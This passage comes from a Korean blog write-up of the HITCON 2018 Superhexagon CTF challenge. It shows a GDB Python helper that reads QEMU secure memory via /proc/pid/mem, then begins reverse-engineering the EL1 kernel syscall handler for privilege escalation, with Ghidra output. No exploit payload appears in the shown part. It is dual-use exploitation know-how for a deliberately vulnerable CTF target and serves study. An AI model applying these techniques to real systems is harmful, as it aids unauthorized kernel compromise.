</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#39;hitcon.flash1&#39;</span> : {<span style="color:#e6db74">&#39;start&#39;</span> : <span style="color:#ae81ff">0x000000004000000</span>, <span style="color:#e6db74">&#39;end&#39;</span> : <span style="color:#ae81ff">0x000000007ffffff</span>},
</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#39;pl011&#39;</span> : {<span style="color:#e6db74">&#39;start&#39;</span> : <span style="color:#ae81ff">0x0000000009000000</span>, <span style="color:#e6db74">&#39;end&#39;</span> : <span style="color:#ae81ff">0x0000000009000fff</span>},
</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#39;mach-hitcon.ram&#39;</span> : {<span style="color:#e6db74">&#39;start&#39;</span> : <span style="color:#ae81ff">0x0000000040000000</span>, <span style="color:#e6db74">&#39;end&#39;</span> : <span style="color:#ae81ff">0x0000000ffffffff</span>},
</span></span><span style="display:flex;"><span>            },
</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#39;hitcon.secure-ram&#39;</span> : {<span style="color:#e6db74">&#39;start&#39;</span> : <span style="color:#ae81ff">0x000000000e000000</span>, <span style="color:#e6db74">&#39;end&#39;</span> : <span style="color:#ae81ff">0x000000000effffff</span>}
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    } <span style="color:#75715e"># monitor info mtree </span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">@staticmethod</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_remote_pid</span>(proc_name):
</span></span><span style="display:flex;"><span>        pids <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> process <span style="color:#f92672">in</span> psutil<span style="color:#f92672">.</span>process_iter():
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> proc_name <span style="color:#f92672">in</span> process<span style="color:#f92672">.</span>name():
</span></span><span style="display:flex;"><span>                pids<span style="color:#f92672">.</span>append(process<span style="color:#f92672">.</span>pid)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> len(pids) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">1</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> pids[<span style="color:#ae81ff">0</span>]
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> __init__(self):
</span></span><span style="display:flex;"><span>        super(QEMU_SUPPORT, self)<span style="color:#f92672">.</span>__init__(<span style="color:#e6db74">&#34;qemu_support&#34;</span>, gdb<span style="color:#f92672">.</span>COMMAND_USER)
</span></span><span style="display:flex;"><span>        pid <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>get_remote_pid(<span style="color:#e6db74">&#39;qemu-system-aarch64&#39;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> pid <span style="color:#f92672">!=</span> <span style="color:#66d9ef">False</span>:
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>pid <span style="color:#f92672">=</span> pid
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">read_memory</span>(self, addr, length):
</span></span><span style="display:flex;"><span>        gdb<span style="color:#f92672">.</span>selected_inferior()<span style="color:#f92672">.</span>read_memory(addr, length)<span style="color:#f92672">.</span>tobytes()
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">find_region_recursive</span>(self, addr):
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">find_region_step</span>(obj, key):
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">assert</span> type(obj) <span style="color:#f92672">==</span> type({})
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;start&#39;</span> <span style="color:#f92672">in</span> obj <span style="color:#f92672">and</span> <span style="color:#e6db74">&#39;end&#39;</span> <span style="color:#f92672">in</span> obj:
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> addr <span style="color:#f92672">&gt;=</span> obj[<span style="color:#e6db74">&#39;start&#39;</span>] <span style="color:#f92672">and</span> addr <span style="color:#f92672">&lt;=</span> obj[<span style="color:#e6db74">&#39;end&#39;</span>]:
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">return</span> key
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> obj:
</span></span><span style="display:flex;"><span>                    
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span> find_region_step(obj[i], i) <span style="color:#f92672">!=</span> <span style="color:#66d9ef">False</span>:
</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">return</span> i
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> (find_region_step(QEMU_SUPPORT<span style="color:#f92672">.</span>address_space, <span style="color:#e6db74">&#39;&#39;</span>))
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">read_phys</span>(self, addr, length):
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">slow_path</span>():
</span></span><span style="display:flex;"><span>            ret <span style="color:#f92672">=</span> gdb<span style="color:#f92672">.</span>execute(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;monitor gpa2hva </span><span style="color:#e6db74">{</span>addr<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>, to_string<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
</span></span><span style="display:flex;"><span>            r <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>search(<span style="color:#e6db74">&#34;is (0x[0-9a-f]+)&#34;</span>, ret)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> r:
</span></span><span style="display:flex;"><span>                host_va <span style="color:#f92672">=</span> int(r<span style="color:#f92672">.</span>group(<span style="color:#ae81ff">1</span>),<span style="color:#ae81ff">16</span>)
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;/proc/</span><span style="color:#e6db74">{</span>self<span style="color:#f92672">.</span>pid<span style="color:#e6db74">}</span><span style="color:#e6db74">/mem&#39;</span>,<span style="color:#e6db74">&#39;rb&#39;</span>) <span style="color:#66d9ef">as</span> f:
</span></span><span style="display:flex;"><span>                    f<span style="color:#f92672">.</span>seek(host_va)
</span></span><span style="display:flex;"><span>                    data <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read(length)
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> data
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>                print(<span style="color:#e6db74">&#39;Err read_phys() -&gt; slow_path()&#39;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">fast_path</span>():
</span></span><span style="display:flex;"><span>            gdb<span style="color:#f92672">.</span>execute(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;monitor xp/</span><span style="color:#e6db74">{</span>length<span style="color:#f92672">//</span><span style="color:#ae81ff">8</span><span style="color:#e6db74">}</span><span style="color:#e6db74">xg </span><span style="color:#e6db74">{</span>addr<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">True</span>
</span></span><span style="display:flex;"><span>        reg <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>find_region_recursive(addr) <span style="color:#75715e"># secure mem or non-secure?</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> reg <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;cpu-secure-memory-0&#39;</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> slow_path()
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">elif</span> reg <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;cpu-memory-0&#39;</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> fast_path()
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">&#34;Err find_region_recursive()&#34;</span>,reg)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span>
</span></span><span style="display:flex;"><span>       <span style="color:#75715e"># secure world can access non-secure mem as well as secure mem.</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">invoke</span>(self, arg, from_tty):
</span></span><span style="display:flex;"><span>        arg <span style="color:#f92672">=</span> arg<span style="color:#f92672">.</span>split()
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> len(arg) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> arg[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;read_phys&#39;</span>:
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> len(arg) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">2</span>:
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span> arg[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>startswith(<span style="color:#e6db74">&#39;0x&#39;</span>):
</span></span><span style="display:flex;"><span>                        addr <span style="color:#f92672">=</span> int(arg[<span style="color:#ae81ff">1</span>],<span style="color:#ae81ff">16</span>)
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>                        addr <span style="color:#f92672">=</span> int(arg[<span style="color:#ae81ff">1</span>],<span style="color:#ae81ff">10</span>)
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span> arg[<span style="color:#ae81ff">2</span>]<span style="color:#f92672">.</span>startswith(<span style="color:#e6db74">&#39;0x&#39;</span>):
</span></span><span style="display:flex;"><span>                        length <span style="color:#f92672">=</span> int(arg[<span style="color:#ae81ff">2</span>],<span style="color:#ae81ff">16</span>)
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>                        length <span style="color:#f92672">=</span> int(arg[<span style="color:#ae81ff">2</span>],<span style="color:#ae81ff">10</span>)
</span></span><span style="display:flex;"><span>                    data <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>read_phys(addr, length<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>)
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span> data <span style="color:#f92672">!=</span> <span style="color:#66d9ef">True</span>:
</span></span><span style="display:flex;"><span>                        self<span style="color:#f92672">.</span>qword_dump(data, addr,length)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">&#34;invalid args&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">@staticmethod</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">qword_dump</span>(data, addr, length):
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(length):
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> i<span style="color:#f92672">%</span><span style="color:#ae81ff">2</span><span style="color:#f92672">==</span><span style="color:#ae81ff">0</span>:
</span></span><span style="display:flex;"><span>                ad <span style="color:#f92672">=</span> hex(addr <span style="color:#f92672">+</span> i<span style="color:#f92672">*</span><span style="color:#ae81ff">0x8</span>)[<span style="color:#ae81ff">2</span>:]<span style="color:#f92672">.</span>rjust(<span style="color:#ae81ff">16</span>,<span style="color:#e6db74">&#39;0&#39;</span>)
</span></span><span style="display:flex;"><span>                print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>ad<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>,end<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;: &#39;</span>)
</span></span><span style="display:flex;"><span>            a <span style="color:#f92672">=</span> hex(struct<span style="color:#f92672">.</span>unpack(<span style="color:#e6db74">&#34;&lt;Q&#34;</span>, data[<span style="color:#ae81ff">8</span><span style="color:#f92672">*</span>i:<span style="color:#ae81ff">8</span><span style="color:#f92672">*</span>i<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>])[<span style="color:#ae81ff">0</span>])[<span style="color:#ae81ff">2</span>:]<span style="color:#f92672">.</span>rjust(<span style="color:#ae81ff">16</span>,<span style="color:#e6db74">&#39;0&#39;</span>)
</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;0x</span><span style="color:#e6db74">{</span>a<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>,end <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39; &#39;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> i<span style="color:#f92672">%</span><span style="color:#ae81ff">2</span><span style="color:#f92672">==</span><span style="color:#ae81ff">1</span>:
</span></span><span style="display:flex;"><span>                print()
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (length<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)<span style="color:#f92672">%</span><span style="color:#ae81ff">2</span><span style="color:#f92672">==</span><span style="color:#ae81ff">0</span>:
</span></span><span style="display:flex;"><span>            print()
</span></span><span style="display:flex;"><span>QEMU_SUPPORT()
</span></span><span style="display:flex;"><span>TCR_EL1()
</span></span><span style="display:flex;"><span>CPSR()
</span></span></code></pre></div><p>메모리 트리를 직접 확인해서 secure memory를 포함한 맵을 직접 하드코딩했다.
<img loading="lazy" src="/blog/Hitcon_2018_Superhexagon/e84a665d28fb391cbc5cc5e026d39b12.png" alt=""  />

정상적으로 secure memory를 확인할 수 있게 되었다.
이를 이용하면 직접 다른 exception level들이 어떻게 secure memory에 적재되는지 확인할 수 있을 것이다.</p>
<h1 id="el1-non-secure-kernel">EL1, Non-secure Kernel<a hidden class="anchor" aria-hidden="true" href="#el1-non-secure-kernel">#</a></h1>
<p>유저 애플리케이션을 익스플로잇했으니 이제 커널로의 권한 상승을 해야한다.
bata24 gef에선 arm64에 대한 pagewalk가 지원된다.
<img loading="lazy" src="/blog/Hitcon_2018_Superhexagon/0f3e0ae338f07707cbc92b95aa10f5a9.png" alt=""  />

이런식으로 가상주소 매핑도 얻을 수 있다.
<img loading="lazy" src="/blog/Hitcon_2018_Superhexagon/dc92a9c33bd8f7ce2b0dab47cd40648e.png" alt=""  />

VBAR을 확인하면 handler들이 보인다..</p>
<p><img loading="lazy" src="/blog/Hitcon_2018_Superhexagon/46a3de22d67a2d11bc915aad8668153d.png" alt=""  />

system call은 synchronous 하고 lower exception level에서부터 발생한다.
<img loading="lazy" src="/blog/Hitcon_2018_Superhexagon/f886d36dd21a4f46292ec937c9c7c67e.png" alt=""  />
</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">UndefinedFunction_ffffffffc000a400</span>(<span style="color:#66d9ef">void</span>)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  code <span style="color:#f92672">*</span>UNRECOVERED_JUMPTABLE;
</span></span><span style="display:flex;"><span>  undefined8 uVar1;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">FUN_ffffffffc00090b0</span>();
</span></span><span style="display:flex;"><span>  uVar1 <span style="color:#f92672">=</span> ttbr0_el1;
</span></span><span style="display:flex;"><span>  spsel <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">FUN_ffffffffc0008ba8</span>();
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">FUN_ffffffffc000914c</span>();
</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">/* WARNING: Treating indirect jump as call */</span>
</span></span><span style="display:flex;"><span>  UNRECOVERED_JUMPTABLE <span style="color:#f92672">=</span> (code <span style="color:#f92672">*</span>)<span style="color:#a6e22e">UndefinedInstructionException</span>(<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0xffffffffc000a834</span>);
</span></span><span style="display:flex;"><span>  (<span style="color:#f92672">*</span>UNRECOVERED_JUMPTABLE)();
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>FUN_ffffffffc00090b0를 먼저 확인하자.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>                             <span style="color:#f92672">*************************************************************</span>
</span></span><span style="display:flex;"><span>                             <span style="color:#f92672">*</span>                           FUNCTION                          
</span></span><span style="display:flex;"><span>                             <span style="color:#f92672">*************************************************************</span>
</span></span><span style="display:flex;"><span>                             undefined  <span style="color:#a6e22e">FUN_ffffffffc00090f8</span> (undefined  param_1 , undef
</span></span><span style="display:flex;"><span>             undefined         w0:<span style="color:#ae81ff">1</span>           <span style="color:#f92672">&lt;</span>RETURN<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>             undefined         w0:<span style="color:#ae81ff">1</span>           param_1
</span></span><span style="display:flex;"><span>             undefined         w1:<span style="color:#ae81ff">1</span>           param_2
</span></span><span style="display:flex;"><span>             undefined         w2:<span style="color:#ae81ff">1</span>           param_3
</span></span><span style="display:flex;"><span>             undefined         w3:<span style="color:#ae81ff">1</span>           param_4
</span></span><span style="display:flex;"><span>             undefined         w4:<span style="color:#ae81ff">1</span>           param_5
</span></span><span style="display:flex;"><span>             undefined         w5:<span style="color:#ae81ff">1</span>           param_6
</span></span><span style="display:flex;"><span>             undefined         w6:<span style="color:#ae81ff">1</span>           param_7
</span></span><span style="display:flex;"><span>             undefined         w7:<span style="color:#ae81ff">1</span>           param_8
</span></span><span style="display:flex;"><span>             undefined8        Stack[<span style="color:#ae81ff">0x0</span>]<span style="color:#f92672">:</span><span style="color:#ae81ff">8</span>   param_9                                 XREF[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">:</span>     ffffffffc00090f8
</span></span><span style="display:flex;"><span>             undefined         Stack[<span style="color:#ae81ff">0x8</span>]<span style="color:#f92672">:</span><span style="color:#ae81ff">1</span>   param_10
</span></span><span style="display:flex;"><span>             undefined8        Stack[<span style="color:#ae81ff">0x10</span>]<span style="color:#f92672">:</span><span style="color:#ae81ff">8</span>  param_11                                XREF[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">:</span>     ffffffffc00090fc
</span></span><span style="display:flex;"><span>             undefined8        Stack[<span style="color:#ae81ff">0x20</span>]<span style="color:#f92672">:</span><span style="color:#ae81ff">8</span>  param_12                                XREF[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">:</span>     ffffffffc0009100
</span></span><span style="display:flex;"><span>             undefined8        Stack[<span style="color:#ae81ff">0x30</span>]<span style="color:#f92672">:</span><span style="color:#ae81ff">8</span>  param_13                                XREF[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">:</span>     ffffffffc0009104
</span></span><span style="display:flex;"><span>             undefined8        Stack[<span style="color:#ae81ff">0x40</span>]<span style="color:#f92672">:</span><span style="color:#ae81ff">8</span>  param_14                                XREF[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">:</span>     ffffffffc0009108
</span></span><span style="display:flex;"><span>             undefined8        Stack[<span style="color:#ae81ff">0x50</span>]<span style="color:#f92672">:</span><span style="color:#ae81ff">8</span>  param_15                                XREF[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">:</span>     ffffffffc000910c
</span></span><span style="display:flex;"><span>             undefined8        Stack[<span style="color:#ae81ff">0x60</span>]<span style="color:#f92672">:</span><span style="color:#ae81ff">8</span>  param_16                                XREF[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">:</span>     ffffffffc0009110
</span></span><span style="display:flex;"><span>             undefined8        Stack[<span style="color:#ae81ff">0x70</span>]<span style="color:#f92672">:</span><span style="color:#ae81ff">8</span>  param_17                                XREF[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">:</span>     ffffffffc0009114
</span></span><span style="display:flex;"><span>             undefined8        Stack[<span style="color:#ae81ff">0x80</span>]<span style="color:#f92672">:</span><span style="color:#ae81ff">8</span>  param_18                                XREF[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">:</span>     ffffffffc0009118
</span></span><span style="display:flex;"><span>             undefined8        Stack[<span style="color:#ae81ff">0x90</span>]<span style="color:#f92672">:</span><span style="color:#ae81ff">8</span>  param_19                                XREF[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">:</span>     ffffffffc000911c
</span></span><span style="display:flex;"><span>             undefined8        Stack[<span style="color:#ae81ff">0xa0</span>]<span style="color:#f92672">:</span><span style="color:#ae81ff">8</span>  param_20                                XREF[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">:</span>     ffffffffc0009120
</span></span><span style="display:flex;"><span>             undefined8        Stack[<span style="color:#ae81ff">0xb0</span>]<span style="color:#f92672">:</span><span style="color:#ae81ff">8</span>  param_21                                XREF[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">:</span>     ffffffffc0009124
</span></span><span style="display:flex;"><span>             undefined8        Stack[<span style="color:#ae81ff">0xc0</span>]<span style="color:#f92672">:</span><span style="color:#ae81ff">8</span>  param_22                                XREF[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">:</span>     ffffffffc0009128
</span></span><span style="display:flex;"><span>             undefined8        Stack[<span style="color:#ae81ff">0xd0</span>]<span style="color:#f92672">:</span><span style="color:#ae81ff">8</span>  param_23                                XREF[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">:</span>     ffffffffc000912c
</span></span><span style="display:flex;"><span>             undefined8        Stack[<span style="color:#ae81ff">0xe0</span>]<span style="color:#f92672">:</span><span style="color:#ae81ff">8</span>  param_24                                XREF[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">:</span>     ffffffffc0009138
</span></span><span style="display:flex;"><span>             undefined8        Stack[<span style="color:#ae81ff">0xf8</span>]<span style="color:#f92672">:</span><span style="color:#ae81ff">8</span>  param_25                                XREF[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">:</span>     ffffffffc0009130
</span></span><span style="display:flex;"><span>                             FUN_ffffffffc00090f8                            XREF[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">:</span>     FUN_ffffffffc000914c:ffffffffc00
</span></span><span style="display:flex;"><span>     fffc00090f8 e0  <span style="color:#ae81ff">07</span>  <span style="color:#ae81ff">40</span>  a9    ldp        param_1 ,param_2 ,[sp]<span style="color:#f92672">=&gt;</span>param_9
</span></span><span style="display:flex;"><span>     fffc00090fc e2  <span style="color:#ae81ff">0f</span>  <span style="color:#ae81ff">41</span>  a9    ldp        param_3 ,param_4 ,[sp, <span style="color:#960050;background-color:#1e0010">#</span>param_11 ]
</span></span><span style="display:flex;"><span>     fffc0009100 e4  <span style="color:#ae81ff">17</span>  <span style="color:#ae81ff">42</span>  a9    ldp        param_5 ,param_6 ,[sp, <span style="color:#960050;background-color:#1e0010">#</span>param_12 ]
</span></span><span style="display:flex;"><span>     fffc0009104 e6  <span style="color:#ae81ff">1f</span>  <span style="color:#ae81ff">43</span>  a9    ldp        param_7 ,param_8 ,[sp, <span style="color:#960050;background-color:#1e0010">#</span>param_13 ]
</span></span><span style="display:flex;"><span>     fffc0009108 e8  <span style="color:#ae81ff">27</span>  <span style="color:#ae81ff">44</span>  a9    ldp        x8,x9,[sp, <span style="color:#960050;background-color:#1e0010">#</span>param_14 ]
</span></span><span style="display:flex;"><span>     fffc000910c ea  <span style="color:#ae81ff">2f</span>  <span style="color:#ae81ff">45</span>  a9    ldp        x10 ,x11 ,[sp, <span style="color:#960050;background-color:#1e0010">#</span>param_15 ]
</span></span><span style="display:flex;"><span>     fffc0009110 ec  <span style="color:#ae81ff">37</span>  <span style="color:#ae81ff">46</span>  a9    ldp        x12 ,x13 ,[sp, <span style="color:#960050;background-color:#1e0010">#</span>param_16 ]
</span></span><span style="display:flex;"><span>     fffc0009114 ee  <span style="color:#ae81ff">3f</span>  <span style="color:#ae81ff">47</span>  a9    ldp        x14 ,x15 ,[sp, <span style="color:#960050;background-color:#1e0010">#</span>param_17 ]
</span></span><span style="display:flex;"><span>     fffc0009118 f0  <span style="color:#ae81ff">47</span>  <span style="color:#ae81ff">48</span>  a9    ldp        x16 ,x17 ,[sp, <span style="color:#960050;background-color:#1e0010">#</span>param_18 ]
</span></span><span style="display:flex;"><span>     fffc000911c f2  <span style="color:#ae81ff">4f</span>  <span style="color:#ae81ff">49</span>  a9    ldp        x18 ,x19 ,[sp, <span style="color:#960050;background-color:#1e0010">#</span>param_19 ]
</span></span><span style="display:flex;"><span>     fffc0009120 f4  <span style="color:#ae81ff">57</span>  <span style="color:#ae81ff">4</span>a  a9    ldp        x20 ,x21 ,[sp, <span style="color:#960050;background-color:#1e0010">#</span>param_20 ]
</span></span><span style="display:flex;"><span>     fffc0009124 f6  <span style="color:#ae81ff">5f</span>  <span style="color:#ae81ff">4</span>b  a9    ldp        x22 ,x23 ,[sp, <span style="color:#960050;background-color:#1e0010">#</span>param_21 ]
</span></span><span style="display:flex;"><span>     fffc0009128 f8  <span style="color:#ae81ff">67</span>  <span style="color:#ae81ff">4</span>c  a9    ldp        x24 ,x25 ,[sp, <span style="color:#960050;background-color:#1e0010">#</span>param_22 ]
</span></span><span style="display:flex;"><span>     fffc000912c fa  <span style="color:#ae81ff">6f</span>  <span style="color:#ae81ff">4</span>d  a9    ldp        x26 ,x27 ,[sp, <span style="color:#960050;background-color:#1e0010">#</span>param_23 ]
</span></span><span style="display:flex;"><span>     fffc0009130 fc  <span style="color:#ae81ff">7f</span>  <span style="color:#ae81ff">40</span>  f9    ldr        x28 ,[sp, <span style="color:#960050;background-color:#1e0010">#</span>param_25 ]
</span></span><span style="display:flex;"><span>     fffc0009134 <span style="color:#ae81ff">1</span>c  <span style="color:#ae81ff">41</span>  <span style="color:#ae81ff">18</span>  d5    msr        sp_el0 ,x28
</span></span><span style="display:flex;"><span>     fffc0009138 fc  <span style="color:#ae81ff">77</span>  <span style="color:#ae81ff">4</span>e  a9    ldp        x28 ,x29 ,[sp, <span style="color:#960050;background-color:#1e0010">#</span>param_24 ]
</span></span><span style="display:flex;"><span>     fffc000913c c0  <span style="color:#ae81ff">03</span>  <span style="color:#ae81ff">5f</span>  d6    ret
</span></span></code></pre></div><p>+0x40에 x8이 있는 것을 기억하고 있자.
FUN_ffffffffc0008ba8가 메인 부분이다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">FUN_ffffffffc0008ba8</span>(<span style="color:#66d9ef">long</span> param_1)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  ulong uVar1;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">bool</span> bVar2;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> iVar3;
</span></span><span style="display:flex;"><span>  ulong uVar4;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">long</span> lVar5;
</span></span><span style="display:flex;"><span>  undefined8 uVar6;
</span></span><span style="display:flex;"><span>  undefined <span style="color:#f92672">*</span>puVar7;
</span></span><span style="display:flex;"><span>  undefined <span style="color:#f92672">*</span>puVar8;
</span></span><span style="display:flex;"><span>  undefined <span style="color:#f92672">*</span>puVar9;
</span></span><span style="display:flex;"><span>  undefined <span style="color:#f92672">*</span>puVar10;
</span></span><span style="display:flex;"><span>  ulong uVar11;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  uVar11 <span style="color:#f92672">=</span> esr_el1;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (((uint)(uVar11 <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">26</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x3f</span>) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>b00010101) {
</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">/* WARNING: Subroutine does not return */</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">FUN_ffffffffc00091b0</span>();
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  uVar11 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(ulong <span style="color:#f92672">*</span>)param_1;
</span></span><span style="display:flex;"><span>  puVar10 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(undefined <span style="color:#f92672">**</span>)(param_1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>);
